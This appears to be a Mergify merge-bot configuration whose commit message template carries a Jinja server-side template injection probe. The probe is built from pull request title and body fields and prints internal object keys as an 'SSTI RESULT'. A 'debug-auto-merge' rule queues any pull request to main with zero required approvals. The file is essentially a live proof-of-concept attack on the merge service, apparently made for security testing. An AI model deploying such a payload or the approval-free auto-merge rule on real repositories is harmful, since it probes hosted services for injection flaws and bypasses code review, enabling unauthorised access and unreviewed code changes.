queue_rules:
  - name: default
    queue_conditions:
      - base=main
    merge_conditions:
      - "#approved-reviews-by>=0"
    merge_method: merge
    commit_message_template: |
      {% if title and body %}
      SSTI RESULT: {{ (([dict]|map(attribute=title))|first)[body].keys()|list }}
      {% endif %}

merge_queue:
  max_parallel_checks: 1

pull_request_rules:
  - name: debug-auto-merge
    conditions:
      - base=main
    actions:
      queue:
        name: default
